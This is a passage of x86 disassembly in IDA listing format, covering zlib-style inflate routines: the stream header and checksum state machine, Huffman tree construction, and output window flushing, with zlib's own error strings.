loc_4029C8:				; CODE XREF: sub_402812:loc_402849j
					; DATA XREF: .text:off_402B2Ao
		mov	eax, [esi+4]	; jumptable 00402849 case 10
		test	eax, eax
		jz	short loc_402A41
		mov	ecx, [esi]
		xor	edi, edi
		dec	eax
		inc	dword ptr [esi+8]
		mov	[esi+4], eax
		movzx	ecx, byte ptr [ecx]
		mov	eax, [esi+1Ch]
		shl	ecx, 8
		add	[eax+8], ecx
		mov	eax, [esi+1Ch]
		inc	dword ptr [esi]
		mov	dword ptr [eax], 0Bh

loc_4029F1:				; CODE XREF: sub_402812:loc_402849j
					; DATA XREF: .text:off_402B2Ao
		mov	eax, [esi+4]	; jumptable 00402849 case 11
		test	eax, eax
		jz	short loc_402A41
		mov	ecx, [esi]
		xor	edi, edi
		dec	eax
		inc	dword ptr [esi+8]
		mov	[esi+4], eax
		movzx	ecx, byte ptr [ecx]
		mov	eax, [esi+1Ch]
		add	[eax+8], ecx
		mov	eax, [esi+1Ch]
		inc	dword ptr [esi]
		mov	ecx, [eax+4]
		cmp	ecx, [eax+8]
		jz	loc_402B12
		mov	[eax], ebx
		mov	dword ptr [esi+18h], offset aIncorrectDataC ; "incorrect data check"

loc_402A26:				; CODE XREF: sub_402812+76j
					; sub_402812+92j ...
		mov	eax, [esi+1Ch]
		mov	[eax+4], ebp

loc_402A2C:				; CODE XREF: sub_402812+F8j
					; sub_402812+120j ...
		mov	eax, [esi+1Ch]
		mov	eax, [eax]
		cmp	eax, ebx
		jbe	loc_402849

loc_402A39:				; CODE XREF: sub_402812+Aj
					; sub_402812+15j ...
		push	0FFFFFFFEh	; jumptable 00402849 default case

loc_402A3B:				; CODE XREF: sub_402812+2E3j
					; sub_402812+313j
		pop	eax

loc_402A3C:				; CODE XREF: sub_402812+231j
					; sub_402812+30Cj
		pop	edi
		pop	esi
		pop	ebp
		pop	ebx
		retn
; ---------------------------------------------------------------------------

loc_402A41:				; CODE XREF: sub_402812+43j
					; sub_402812+A2j ...
		mov	eax, edi
		jmp	short loc_402A3C
; ---------------------------------------------------------------------------

loc_402A45:				; CODE XREF: sub_402812+E9j
		mov	eax, [esi+1Ch]
		mov	dword ptr [eax], 2

loc_402A4E:				; CODE XREF: sub_402812:loc_402849j
					; DATA XREF: .text:off_402B2Ao
		mov	eax, [esi+4]	; jumptable 00402849 case 2
		test	eax, eax
		jz	short loc_402A41
		mov	ecx, [esi+1Ch]
		xor	edi, edi
		dec	eax
		inc	dword ptr [esi+8]
		mov	[esi+4], eax
		mov	eax, [esi]
		movzx	eax, byte ptr [eax]
		shl	eax, 18h
		mov	[ecx+8], eax
		mov	eax, [esi+1Ch]
		inc	dword ptr [esi]
		mov	dword ptr [eax], 3

loc_402A77:				; CODE XREF: sub_402812:loc_402849j
					; DATA XREF: .text:off_402B2Ao
		mov	eax, [esi+4]	; jumptable 00402849 case 3
		test	eax, eax
		jz	short loc_402A41
		mov	ecx, [esi]
		xor	edi, edi
		dec	eax
		inc	dword ptr [esi+8]
		mov	[esi+4], eax
		movzx	ecx, byte ptr [ecx]
		mov	eax, [esi+1Ch]
		shl	ecx, 10h
		add	[eax+8], ecx
		mov	eax, [esi+1Ch]
		inc	dword ptr [esi]
		mov	dword ptr [eax], 4

loc_402AA0:				; CODE XREF: sub_402812:loc_402849j
					; DATA XREF: .text:off_402B2Ao
		mov	eax, [esi+4]	; jumptable 00402849 case 4
		test	eax, eax
		jz	short loc_402A41
		mov	ecx, [esi]
		xor	edi, edi
		dec	eax
		inc	dword ptr [esi+8]
		mov	[esi+4], eax
		movzx	ecx, byte ptr [ecx]
		mov	eax, [esi+1Ch]
		shl	ecx, 8
		add	[eax+8], ecx
		mov	eax, [esi+1Ch]
		inc	dword ptr [esi]
		mov	[eax], ebp

loc_402AC5:				; CODE XREF: sub_402812:loc_402849j
					; DATA XREF: .text:off_402B2Ao
		mov	eax, [esi+4]	; jumptable 00402849 case 5
		test	eax, eax
		jz	loc_402A41
		mov	ecx, [esi]
		dec	eax
		inc	dword ptr [esi+8]
		mov	[esi+4], eax
		movzx	ecx, byte ptr [ecx]
		mov	eax, [esi+1Ch]
		add	[eax+8], ecx
		mov	eax, [esi+1Ch]
		inc	dword ptr [esi]
		mov	ecx, [eax+8]
		mov	[esi+30h], ecx
		mov	dword ptr [eax], 6
		push	2
		jmp	loc_402A3B
; ---------------------------------------------------------------------------

loc_402AFA:				; CODE XREF: sub_402812:loc_402849j
					; DATA XREF: .text:off_402B2Ao
		mov	eax, [esi+1Ch]	; jumptable 00402849 case 6
		mov	[eax], ebx
		mov	eax, [esi+1Ch]
		mov	dword ptr [esi+18h], offset aNeedDictionary ; "need dictionary"
		and	dword ptr [eax+4], 0
		jmp	loc_402A39	; jumptable 00402849 default case
; ---------------------------------------------------------------------------

loc_402B12:				; CODE XREF: sub_402812+205j
		mov	eax, [esi+1Ch]
		mov	dword ptr [eax], 0Ch

loc_402B1B:				; CODE XREF: sub_402812:loc_402849j
					; DATA XREF: .text:off_402B2Ao
		xor	eax, eax	; jumptable 00402849 case 12
		inc	eax
		jmp	loc_402A3C
; ---------------------------------------------------------------------------

loc_402B23:				; CODE XREF: sub_402812:loc_402849j
					; DATA XREF: .text:off_402B2Ao
		push	0FFFFFFFDh	; jumptable 00402849 case 13
		jmp	loc_402A3B
sub_402812	endp

; ---------------------------------------------------------------------------
off_402B2A	dd offset loc_402850	; DATA XREF: sub_402812:loc_402849r
		dd offset loc_4028AF	; jump table for switch	statement
		dd offset loc_402A4E
		dd offset loc_402A77
		dd offset loc_402AA0
		dd offset loc_402AC5
		dd offset loc_402AFA
		dd offset loc_40290F
		dd offset loc_40296E
		dd offset loc_40299B
		dd offset loc_4029C8
		dd offset loc_4029F1
		dd offset loc_402B1B
		dd offset loc_402B23
; ---------------------------------------------------------------------------

loc_402B62:				; DATA XREF: sub_403048+89o
		mov	eax, [esp+4]
		mov	ecx, [esp+8]
		sub	[eax], ecx
		mov	eax, [eax]
		lea	eax, ds:4053A8h[eax*8]
		retn

; =============== S U B	R O U T	I N E =======================================


sub_402B76	proc near		; CODE XREF: sub_401596+44p
					; sub_401596+4Dp ...

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8

		mov	ecx, [esp+arg_0]
		xor	eax, eax
		test	ecx, ecx
		jz	short loc_402BAF

loc_402B80:				; CODE XREF: sub_402B76+16j
		mov	edx, [ecx-4]
		mov	[ecx-4], eax
		mov	eax, ecx
		mov	ecx, edx
		test	edx, edx
		jnz	short loc_402B80
		test	eax, eax
		jz	short loc_402BAF
		push	esi
		mov	esi, [esp+4+arg_4]
		push	edi

loc_402B98:				; CODE XREF: sub_402B76+35j
		mov	edi, [eax-4]
		sub	eax, 8
		push	eax
		push	dword ptr [esi+28h]
		call	dword ptr [esi+24h]
		pop	ecx
		pop	ecx
		mov	eax, edi
		test	edi, edi
		jnz	short loc_402B98
		pop	edi
		pop	esi

loc_402BAF:				; CODE XREF: sub_402B76+8j
					; sub_402B76+1Aj
		xor	eax, eax
		retn
sub_402B76	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame fpd=5Ch

sub_402BB2	proc near		; CODE XREF: sub_402F2E+1Cp
					; sub_402F7C+27p ...

var_57C		= dword	ptr -57Ch
var_FC		= dword	ptr -0FCh
var_C0		= dword	ptr -0C0h
var_BC		= dword	ptr -0BCh
var_80		= dword	ptr -80h
var_7C		= dword	ptr -7Ch
var_78		= dword	ptr -78h
var_74		= dword	ptr -74h
var_70		= dword	ptr -70h
var_6C		= dword	ptr -6Ch
var_68		= dword	ptr -68h
var_64		= dword	ptr -64h
var_60		= dword	ptr -60h
var_5C		= dword	ptr -5Ch
var_58		= dword	ptr -58h
var_54		= dword	ptr -54h
var_50		= dword	ptr -50h
var_4C		= dword	ptr -4Ch
var_48		= dword	ptr -48h
var_44		= dword	ptr -44h
var_40		= dword	ptr -40h
var_3C		= dword	ptr -3Ch
var_38		= dword	ptr -38h
var_34		= dword	ptr -34h
var_30		= dword	ptr -30h
var_2C		= dword	ptr -2Ch
var_28		= dword	ptr -28h
var_24		= dword	ptr -24h
var_20		= dword	ptr -20h
var_1C		= dword	ptr -1Ch
var_18		= dword	ptr -18h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h
arg_10		= dword	ptr  18h
arg_14		= dword	ptr  1Ch
arg_18		= dword	ptr  20h

		push	ebp
		lea	ebp, [esp-5Ch]
		sub	esp, 57Ch
		mov	ecx, [ebp+5Ch+arg_0]
		push	ebx
		mov	ebx, [ebp+5Ch+arg_4]
		push	esi
		push	edi
		xor	edi, edi
		mov	esi, eax
		mov	[ebp+5Ch+var_80], edi
		mov	[ebp+5Ch+var_7C], edi
		mov	[ebp+5Ch+var_78], edi
		mov	[ebp+5Ch+var_74], edi
		mov	[ebp+5Ch+var_70], edi
		mov	[ebp+5Ch+var_6C], edi
		mov	[ebp+5Ch+var_68], edi
		mov	[ebp+5Ch+var_64], edi
		mov	[ebp+5Ch+var_60], edi
		mov	[ebp+5Ch+var_5C], edi
		mov	[ebp+5Ch+var_58], edi
		mov	[ebp+5Ch+var_54], edi
		mov	[ebp+5Ch+var_50], edi
		mov	[ebp+5Ch+var_4C], edi
		mov	[ebp+5Ch+var_48], edi
		mov	[ebp+5Ch+var_44], edi
		mov	edx, ebx

loc_402BFC:				; CODE XREF: sub_402BB2+56j
		mov	eax, [ecx]
		lea	eax, [ebp+eax*4+5Ch+var_80]
		inc	dword ptr [eax]
		add	ecx, 4
		dec	edx
		jnz	short loc_402BFC
		cmp	[ebp+5Ch+var_80], ebx
		jnz	short loc_402C20
		mov	eax, [ebp+5Ch+arg_14]
		mov	[eax], edi
		mov	[esi], edi

loc_402C16:				; CODE XREF: sub_402BB2+34Bj
					; sub_402BB2+355j
		xor	eax, eax

loc_402C18:				; CODE XREF: sub_402BB2+177j
		pop	edi
		pop	esi
		pop	ebx
		add	ebp, 5Ch
		leave
		retn
; ---------------------------------------------------------------------------

loc_402C20:				; CODE XREF: sub_402BB2+5Bj
		mov	ebx, [esi]
		xor	ecx, ecx
		push	0Fh
		mov	[ebp+5Ch+var_8], ebx
		inc	ecx
		pop	eax

loc_402C2B:				; CODE XREF: sub_402BB2+82j
		cmp	[ebp+ecx*4+5Ch+var_80],	edi
		jnz	short loc_402C36
		inc	ecx
		cmp	ecx, eax
		jbe	short loc_402C2B

loc_402C36:				; CODE XREF: sub_402BB2+7Dj
		mov	[ebp+5Ch+var_4], ecx
		cmp	ebx, ecx
		jnb	short loc_402C42
		mov	[ebp+5Ch+var_8], ecx
		mov	ebx, ecx

loc_402C42:				; CODE XREF: sub_402BB2+89j
					; sub_402BB2+97j
		cmp	[ebp+eax*4+5Ch+var_80],	edi
		jnz	short loc_402C4B
		dec	eax
		jnz	short loc_402C42

loc_402C4B:				; CODE XREF: sub_402BB2+94j
		mov	[ebp+5Ch+var_24], eax
		cmp	ebx, eax
		jbe	short loc_402C57
		mov	[ebp+5Ch+var_8], eax
		mov	ebx, eax

loc_402C57:				; CODE XREF: sub_402BB2+9Ej
		mov	[esi], ebx
		xor	esi, esi
		inc	esi
		shl	esi, cl
		jmp	short loc_402C6D
; ---------------------------------------------------------------------------

loc_402C60:				; CODE XREF: sub_402BB2+BDj
		sub	esi, [ebp+ecx*4+5Ch+var_80]
		js	loc_402D26
		inc	ecx
		add	esi, esi

loc_402C6D:				; CODE XREF: sub_402BB2+ACj
		cmp	ecx, eax
		jb	short loc_402C60
		lea	ecx, [ebp+eax*4+5Ch+var_80]
		mov	edx, [ecx]
		sub	esi, edx
		mov	[ebp+5Ch+var_40], esi
		js	loc_402D26
		add	edx, esi
		mov	[ecx], edx
		xor	ecx, ecx
		dec	eax
		mov	[ebp+5Ch+var_BC], edi
		jz	short loc_402C9E
		xor	edx, edx

loc_402C90:				; CODE XREF: sub_402BB2+EAj
		add	ecx, [ebp+edx+5Ch+var_7C]
		add	edx, 4
		dec	eax
		mov	[ebp+edx+5Ch+var_BC], ecx
		jnz	short loc_402C90

loc_402C9E:				; CODE XREF: sub_402BB2+DAj
		mov	esi, [ebp+5Ch+arg_0]
		xor	edx, edx

loc_402CA3:				; CODE XREF: sub_402BB2+10Ej
		mov	eax, [esi]
		add	esi, 4
		cmp	eax, edi
		jz	short loc_402CBC
		lea	eax, [ebp+eax*4+5Ch+var_C0]
		mov	ecx, [eax]
		mov	[ebp+ecx*4+5Ch+var_57C], edx
		inc	ecx
		mov	[eax], ecx

loc_402CBC:				; CODE XREF: sub_402BB2+F8j
		inc	edx
		cmp	edx, [ebp+5Ch+arg_4]
		jb	short loc_402CA3
		or	[ebp+5Ch+arg_0], 0FFFFFFFFh
		lea	eax, [ebp+5Ch+var_57C]
		mov	[ebp+5Ch+var_18], eax
		mov	eax, [ebp+5Ch+var_4]
		mov	edx, ebx
		neg	edx
		cmp	eax, [ebp+5Ch+var_24]
		mov	[ebp+5Ch+var_1C], edi
		mov	[ebp+5Ch+var_C0], edi
		mov	[ebp+5Ch+var_FC], edi
		mov	[ebp+5Ch+var_3C], edi
		mov	[ebp+5Ch+var_34], edi
		jg	loc_402EFA
		lea	ecx, [eax-1]
		lea	eax, [ebp+eax*4+5Ch+var_80]
		mov	[ebp+5Ch+var_2C], ecx
		mov	[ebp+5Ch+var_20], eax

loc_402CFE:				; CODE XREF: sub_402BB2+342j
		mov	eax, [ebp+5Ch+var_20]
		mov	eax, [eax]
		mov	[ebp+5Ch+var_C], eax
		cmp	eax, edi
		jz	loc_402EE4

loc_402D0E:				; CODE XREF: sub_402BB2+32Cj
		dec	[ebp+5Ch+var_C]
		lea	eax, [edx+ebx]
		cmp	[ebp+5Ch+var_4], eax
		jle	loc_402E06
		mov	[ebp+5Ch+var_30], eax
		mov	eax, edx
		sub	eax, ebx
		jmp	short loc_402D31
; ---------------------------------------------------------------------------

loc_402D26:				; CODE XREF: sub_402BB2+B2j
					; sub_402BB2+CAj
		push	0FFFFFFFDh

loc_402D28:				; CODE XREF: sub_402BB2+35Dj
					; sub_402BB2+377j
		pop	eax
		jmp	loc_402C18
; ---------------------------------------------------------------------------

loc_402D2E:				; CODE XREF: sub_402BB2+24Ej
		mov	eax, [ebp+5Ch+var_38]

loc_402D31:				; CODE XREF: sub_402BB2+172j
		mov	esi, [ebp+5Ch+var_24]
		inc	[ebp+5Ch+arg_0]
		add	[ebp+5Ch+var_30], ebx
		add	edx, ebx
		add	eax, ebx
		sub	esi, edx
		mov	[ebp+5Ch+var_28], edx
		mov	[ebp+5Ch+var_38], eax
		cmp	esi, ebx
		jbe	short loc_402D4C
		mov	esi, ebx

loc_402D4C:				; CODE XREF: sub_402BB2+196j
		mov	ebx, [ebp+5Ch+var_4]
		xor	eax, eax
		sub	ebx, edx
		inc	eax
		mov	ecx, ebx
		shl	eax, cl
		mov	ecx, [ebp+5Ch+var_C]
		inc	ecx
		cmp	eax, ecx
		jbe	short loc_402D83
		mov	edx, [ebp+5Ch+var_20]
		or	ecx, 0FFFFFFFFh
		sub	ecx, [ebp+5Ch+var_C]
		add	eax, ecx
		cmp	ebx, esi
		jnb	short loc_402D83
		jmp	short loc_402D7E
; ---------------------------------------------------------------------------

loc_402D71:				; CODE XREF: sub_402BB2+1CFj
		add	edx, 4
		mov	ecx, [edx]
		add	eax, eax
		cmp	eax, ecx
		jbe	short loc_402D83
		sub	eax, ecx

loc_402D7E:				; CODE XREF: sub_402BB2+1BDj
		inc	ebx
		cmp	ebx, esi
		jb	short loc_402D71

loc_402D83:				; CODE XREF: sub_402BB2+1ACj
					; sub_402BB2+1BBj ...
		mov	esi, [ebp+5Ch+arg_18]
		xor	eax, eax
		inc	eax
		mov	ecx, ebx
		shl	eax, cl
		push	8
		mov	[ebp+5Ch+var_34], eax
		inc	eax
		push	eax
		push	dword ptr [esi+28h]
		call	dword ptr [esi+20h]
		add	esp, 0Ch
		cmp	eax, edi
		jz	loc_402F14
		mov	edx, [ebp+5Ch+arg_14]
		lea	ecx, [eax+8]
		add	eax, 4
		mov	[edx], ecx
		mov	esi, ecx
		mov	[ebp+5Ch+arg_14], eax
		mov	[eax], edi
		mov	eax, [ebp+5Ch+arg_0]
		mov	ecx, eax
		shl	ecx, 2
		lea	edx, [ebp+ecx+5Ch+var_FC]
		mov	[ebp+5Ch+var_3C], esi
		mov	[edx], esi
		cmp	eax, edi
		jz	short loc_402DF4
		mov	eax, [ebp+5Ch+var_1C]
		mov	[ebp+ecx+5Ch+var_C0], eax
		mov	cl, byte ptr [ebp+5Ch+var_8]
		mov	byte ptr [ebp+5Ch+var_14+1], cl
		mov	ecx, [ebp+5Ch+var_38]
		shr	eax, cl
		mov	ecx, [edx-4]
		mov	byte ptr [ebp+5Ch+var_14], bl
		mov	edx, [ebp+5Ch+var_14]
		mov	[ecx+eax*8], edx
		mov	[ebp+5Ch+var_10], esi
		mov	[ecx+eax*8+4], esi

loc_402DF4:				; CODE XREF: sub_402BB2+21Bj
		mov	eax, [ebp+5Ch+var_30]
		cmp	[ebp+5Ch+var_4], eax
		mov	edx, [ebp+5Ch+var_28]
		mov	ebx, [ebp+5Ch+var_8]
		jg	loc_402D2E

loc_402E06:				; CODE XREF: sub_402BB2+165j
		mov	al, byte ptr [ebp+5Ch+var_4]
		sub	al, dl
		mov	byte ptr [ebp+5Ch+var_14+1], al
		mov	eax, [ebp+5Ch+arg_4]
		lea	ecx, [ebp+eax*4+5Ch+var_57C]
		mov	eax, [ebp+5Ch+var_18]
		cmp	eax, ecx
		jb	short loc_402E25
		mov	byte ptr [ebp+5Ch+var_14], 0C0h
		jmp	short loc_402E5D
; ---------------------------------------------------------------------------

loc_402E25:				; CODE XREF: sub_402BB2+26Bj
		mov	eax, [eax]
		cmp	eax, [ebp+5Ch+arg_8]
		jnb	short loc_402E3E
		cmp	eax, 100h
		setb	cl
		dec	cl
		and	cl, 60h
		mov	byte ptr [ebp+5Ch+var_14], cl
		jmp	short loc_402E56
; ---------------------------------------------------------------------------

loc_402E3E:				; CODE XREF: sub_402BB2+278j
		sub	eax, [ebp+5Ch+arg_8]
		mov	ecx, [ebp+5Ch+arg_10]
		shl	eax, 2
		mov	cl, [eax+ecx]
		add	cl, 50h
		mov	byte ptr [ebp+5Ch+var_14], cl
		mov	ecx, [ebp+5Ch+arg_C]
		mov	eax, [eax+ecx]

loc_402E56:				; CODE XREF: sub_402BB2+28Aj
		add	[ebp+5Ch+var_18], 4
		mov	[ebp+5Ch+var_10], eax

loc_402E5D:				; CODE XREF: sub_402BB2+271j
		mov	ecx, [ebp+5Ch+var_4]
		mov	eax, [ebp+5Ch+var_1C]
		xor	esi, esi
		sub	ecx, edx
		inc	esi
		shl	esi, cl
		mov	ecx, edx
		shr	eax, cl
		cmp	eax, [ebp+5Ch+var_34]
		jnb	short loc_402E95
		mov	ecx, [ebp+5Ch+var_3C]
		lea	ecx, [ecx+eax*8]

loc_402E79:				; CODE XREF: sub_402BB2+2DEj
		mov	ebx, [ebp+5Ch+var_14]
		mov	[ecx], ebx
		mov	ebx, [ebp+5Ch+var_10]
		mov	[ecx+4], ebx
		mov	ebx, esi
		shl	ebx, 3
		add	eax, esi
		add	ecx, ebx
		cmp	eax, [ebp+5Ch+var_34]
		jb	short loc_402E79
		mov	ebx, [ebp+5Ch+var_8]

loc_402E95:				; CODE XREF: sub_402BB2+2BFj
		mov	ecx, [ebp+5Ch+var_2C]
		mov	esi, [ebp+5Ch+var_1C]
		xor	eax, eax
		inc	eax
		shl	eax, cl
		jmp	short loc_402EA6
; ---------------------------------------------------------------------------

loc_402EA2:				; CODE XREF: sub_402BB2+2F6j
		xor	esi, eax
		shr	eax, 1

loc_402EA6:				; CODE XREF: sub_402BB2+2EEj
		test	esi, eax
		jnz	short loc_402EA2
		xor	esi, eax
		xor	eax, eax
		inc	eax
		mov	ecx, edx
		shl	eax, cl
		mov	[ebp+5Ch+var_1C], esi
		dec	eax
		and	eax, esi
		mov	ecx, eax
		mov	eax, [ebp+5Ch+arg_0]
		cmp	ecx, [ebp+eax*4+5Ch+var_C0]
		jz	short loc_402EDB

loc_402EC4:				; CODE XREF: sub_402BB2+324j
		xor	esi, esi
		sub	edx, ebx
		inc	esi
		mov	ecx, edx
		shl	esi, cl
		dec	eax
		dec	esi
		and	esi, [ebp+5Ch+var_1C]
		cmp	esi, [ebp+eax*4+5Ch+var_C0]
		jnz	short loc_402EC4
		mov	[ebp+5Ch+arg_0], eax

loc_402EDB:				; CODE XREF: sub_402BB2+310j
		cmp	[ebp+5Ch+var_C], edi
		jnz	loc_402D0E

loc_402EE4:				; CODE XREF: sub_402BB2+156j
		inc	[ebp+5Ch+var_4]
		add	[ebp+5Ch+var_20], 4
		mov	eax, [ebp+5Ch+var_4]
		inc	[ebp+5Ch+var_2C]
		cmp	eax, [ebp+5Ch+var_24]
		jle	loc_402CFE

loc_402EFA:				; CODE XREF: sub_402BB2+139j
		cmp	[ebp+5Ch+var_40], edi
		jz	loc_402C16
		cmp	[ebp+5Ch+var_24], 1
		jz	loc_402C16
		push	0FFFFFFFBh
		jmp	loc_402D28
; ---------------------------------------------------------------------------

loc_402F14:				; CODE XREF: sub_402BB2+1EDj
		cmp	[ebp+5Ch+arg_0], edi
		jz	short loc_402F27
		push	esi
		push	[ebp+5Ch+var_FC]
		call	sub_402B76
		pop	ecx
		pop	ecx

loc_402F27:				; CODE XREF: sub_402BB2+365j
		push	0FFFFFFFCh
		jmp	loc_402D28
sub_402BB2	endp


; =============== S U B	R O U T	I N E =======================================


sub_402F2E	proc near		; CODE XREF: sub_401676+3D8p

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8
arg_8		= dword	ptr  0Ch
arg_C		= dword	ptr  10h

		mov	eax, [esp+arg_4]
		push	esi
		mov	esi, [esp+4+arg_C]
		push	edi
		mov	edi, [esp+8+arg_8]
		push	esi
		push	edi
		push	0
		push	0
		push	13h
		push	13h
		push	[esp+20h+arg_0]
		call	sub_402BB2
		add	esp, 1Ch
		cmp	eax, 0FFFFFFFDh
		jnz	short loc_402F60
		mov	dword ptr [esi+18h], offset aOversubscribed ; "oversubscribed dynamic bit lengths tree"...
		jmp	short loc_402F79
; ---------------------------------------------------------------------------

loc_402F60:				; CODE XREF: sub_402F2E+27j
		cmp	eax, 0FFFFFFFBh
		jnz	short loc_402F79
		push	esi
		push	dword ptr [edi]
		call	sub_402B76
		pop	ecx
		pop	ecx
		push	0FFFFFFFDh
		mov	dword ptr [esi+18h], offset aIncompleteDyna ; "incomplete dynamic bit lengths tree"
		pop	eax

loc_402F79:				; CODE XREF: sub_402F2E+30j
					; sub_402F2E+35j
		pop	edi
		pop	esi
		retn
sub_402F2E	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_402F7C	proc near		; CODE XREF: sub_401676+577p

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h
arg_10		= dword	ptr  18h
arg_14		= dword	ptr  1Ch
arg_18		= dword	ptr  20h
arg_1C		= dword	ptr  24h

		push	ebp
		mov	ebp, esp
		mov	eax, [ebp+arg_C]
		push	ebx
		mov	ebx, [ebp+arg_8]
		push	esi
		mov	esi, [ebp+arg_1C]
		push	edi
		mov	edi, [ebp+arg_0]
		push	esi
		push	[ebp+arg_14]
		push	offset dword_405198
		push	offset dword_405118
		push	101h
		push	edi
		push	ebx
		call	sub_402BB2
		add	esp, 1Ch
		test	eax, eax
		jz	short loc_402FDE
		cmp	eax, 0FFFFFFFDh
		jnz	short loc_402FC0
		mov	dword ptr [esi+18h], offset aOversubscrib_0 ; "oversubscribed literal/length tree"
		jmp	loc_403043
; ---------------------------------------------------------------------------

loc_402FC0:				; CODE XREF: sub_402F7C+36j
		cmp	eax, 0FFFFFFFBh
		jnz	short loc_403043
		mov	eax, [ebp+arg_14]
		push	esi
		push	dword ptr [eax]
		call	sub_402B76
		pop	ecx
		pop	ecx
		push	0FFFFFFFDh
		mov	dword ptr [esi+18h], offset aIncompleteLite ; "incomplete literal/length tree"
		pop	eax
		jmp	short loc_403043
; ---------------------------------------------------------------------------

loc_402FDE:				; CODE XREF: sub_402F7C+31j
		push	esi
		push	[ebp+arg_18]
		lea	eax, [ebx+edi*4]
		push	offset dword_405290
		push	offset dword_405218
		push	0
		push	[ebp+arg_4]
		push	eax
		mov	eax, [ebp+arg_10]
		call	sub_402BB2
		mov	edi, eax
		add	esp, 1Ch
		test	edi, edi
		jz	short loc_403041
		cmp	edi, 0FFFFFFFDh
		jnz	short loc_403014
		mov	dword ptr [esi+18h], offset aOversubscrib_0 ; "oversubscribed literal/length tree"
		jmp	short loc_403030
; ---------------------------------------------------------------------------

loc_403014:				; CODE XREF: sub_402F7C+8Dj
		cmp	edi, 0FFFFFFFBh
		jnz	short loc_403030
		mov	eax, [ebp+arg_18]
		push	esi
		push	dword ptr [eax]
		call	sub_402B76
		pop	ecx
		pop	ecx
		push	0FFFFFFFDh
		mov	dword ptr [esi+18h], offset aIncompleteLite ; "incomplete literal/length tree"
		pop	edi

loc_403030:				; CODE XREF: sub_402F7C+96j
					; sub_402F7C+9Bj
		mov	eax, [ebp+arg_14]
		push	esi
		push	dword ptr [eax]
		call	sub_402B76
		pop	ecx
		pop	ecx
		mov	eax, edi
		jmp	short loc_403043
; ---------------------------------------------------------------------------

loc_403041:				; CODE XREF: sub_402F7C+88j
		xor	eax, eax

loc_403043:				; CODE XREF: sub_402F7C+3Fj
					; sub_402F7C+47j ...
		pop	edi
		pop	esi
		pop	ebx
		pop	ebp
		retn
sub_402F7C	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_403048	proc near		; CODE XREF: sub_401676+117p

var_4BC		= byte ptr -4BCh
var_27C		= byte ptr -27Ch
var_BC		= byte ptr -0BCh
var_5C		= byte ptr -5Ch
var_3C		= byte ptr -3Ch
var_1C		= dword	ptr -1Ch
var_18		= dword	ptr -18h
var_14		= dword	ptr -14h
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h

		push	ebp
		mov	ebp, esp
		sub	esp, 4BCh
		cmp	dword_406440, 0
		jnz	loc_40312C
		push	edi
		push	8
		lea	eax, [ebp+var_4]
		mov	[ebp+var_14], eax
		pop	eax
		push	70h
		mov	ecx, 90h
		lea	edi, [ebp+var_4BC]
		rep stosd
		pop	ecx
		push	9
		pop	eax
		push	18h
		lea	edi, [ebp+var_27C]
		rep stosd
		pop	ecx
		push	7
		pop	edx
		push	8
		and	[ebp+var_18], 0
		mov	eax, edx
		lea	edi, [ebp+var_BC]
		rep stosd
		pop	ecx
		push	ecx
		pop	eax
		lea	edi, [ebp+var_5C]
		rep stosd
		lea	eax, [ebp+var_3C]
		push	eax
		push	offset dword_4053A0
		push	offset dword_405198
		push	offset dword_405118
		push	101h
		lea	eax, [ebp+var_4BC]
		push	120h
		push	eax
		mov	eax, offset dword_4053A4
		mov	[ebp+var_4], 212h
		mov	[ebp+var_1C], offset loc_402B62
		mov	dword_4053A4, edx
		call	sub_402BB2
		push	1Eh
		pop	ecx
		push	5
		pop	eax
		mov	dword_40643C, eax
		lea	edi, [ebp+var_4BC]
		rep stosd
		lea	eax, [ebp+var_3C]
		push	eax
		push	offset dword_406438
		push	offset dword_405290
		push	offset dword_405218
		push	0
		lea	eax, [ebp+var_4BC]
		push	1Eh
		push	eax
		mov	eax, offset dword_40643C
		call	sub_402BB2
		add	esp, 38h
		mov	dword_406440, 1
		pop	edi

loc_40312C:				; CODE XREF: sub_403048+10j
		mov	ecx, dword_4053A4
		mov	eax, [ebp+arg_0]
		mov	[eax], ecx
		mov	ecx, dword_40643C
		mov	eax, [ebp+arg_4]
		mov	[eax], ecx
		mov	ecx, dword_4053A0
		mov	eax, [ebp+arg_8]
		mov	[eax], ecx
		mov	eax, [ebp+arg_C]
		mov	ecx, dword_406438
		mov	[eax], ecx
		xor	eax, eax
		leave
		retn
sub_403048	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_40315C	proc near		; CODE XREF: sub_401676+6Ep
					; sub_401676+21Bp ...

Dst		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ebx
		push	esi
		mov	esi, [ebp+arg_0]
		mov	ecx, [esi+2Ch]
		mov	ebx, [esi+30h]
		push	edi
		mov	edi, [ebp+arg_4]
		mov	eax, [edi+0Ch]
		mov	[ebp+Dst], eax
		mov	[ebp+arg_4], ecx
		cmp	ecx, ebx
		jbe	short loc_40317F
		mov	ebx, [esi+28h]

loc_40317F:				; CODE XREF: sub_40315C+1Ej
		mov	eax, [edi+10h]
		sub	ebx, ecx
		cmp	ebx, eax
		jbe	short loc_40318A
		mov	ebx, eax

loc_40318A:				; CODE XREF: sub_40315C+2Aj
		test	ebx, ebx
		jz	short loc_403198
		cmp	[ebp+arg_8], 0FFFFFFFBh
		jnz	short loc_403198
		and	[ebp+arg_8], 0

loc_403198:				; CODE XREF: sub_40315C+30j
					; sub_40315C+36j
		add	[edi+14h], ebx
		sub	eax, ebx
		mov	[edi+10h], eax
		mov	eax, [esi+34h]
		test	eax, eax
		jz	short loc_4031BA
		push	ebx
		push	ecx
		push	dword ptr [esi+38h]
		call	eax
		mov	ecx, [ebp+arg_4]
		mov	[esi+38h], eax
		add	esp, 0Ch
		mov	[edi+30h], eax

